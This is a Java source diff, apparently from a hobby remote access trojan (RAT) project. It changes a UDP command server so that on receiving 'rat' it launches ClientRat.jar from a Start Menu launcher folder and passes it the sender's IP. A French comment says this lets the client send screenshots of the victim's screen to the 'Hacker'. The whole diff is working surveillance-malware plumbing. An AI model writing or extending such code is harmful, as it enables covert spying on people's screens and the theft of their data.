@@ -26,6 +26,7 @@ public class ServerUDP
 	private DatagramSocket m_sock;
 	private State state;
 	private Robot r;
+	private String remoteIP;
 	
 
 	
@@ -64,6 +65,7 @@ public class ServerUDP
 		byte[] bufR = new byte[2048];
 		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
 		socket.receive(dpR);
+		setRemoteIP(dpR.getAddress().getHostAddress());
 		return new String(bufR, dpR.getOffset(), dpR.getLength());
 	}
 
@@ -104,9 +106,9 @@ public class ServerUDP
 		 * ================= AUTRE PROGRAMME =================
 		 */
 		if (receiveUDP.matches("rat")) {
-			return "java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\Rat.jar";
+			System.out.println("IP : "+getRemoteIP());
+			return "java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\ClientRat.jar "+getRemoteIP();
 		}
-		
 		
 		
 		/*
@@ -315,6 +317,7 @@ public class ServerUDP
 		
 		return s_null;
 	}
+
 
 
 
@@ -556,4 +559,12 @@ public class ServerUDP
 		return;
 	}
 
+	
+
+
+	/* Pour le RAT, permet au Client de connaître l'IP du Hacker 
+	 * pour lui envoyer les screenshot de son écran (entre autre */
+	private void setRemoteIP(String hostAddress) {this.remoteIP = hostAddress;}
+	private String getRemoteIP() {return this.remoteIP;}
+	
 }
